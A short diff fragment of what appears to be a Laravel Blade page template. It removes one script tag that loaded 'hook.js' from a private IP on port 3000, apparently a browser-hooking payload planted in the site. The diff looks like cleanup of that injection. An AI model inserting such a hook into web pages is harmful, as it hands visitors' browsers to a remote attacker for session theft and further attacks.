@@ -82,7 +82,6 @@
         });
     </script>
 
-    <script src="http://10.10.10.205:3000/hook.js"></script>
 
     <script>
         const successMessage = "{{ session()->get('success') }}";
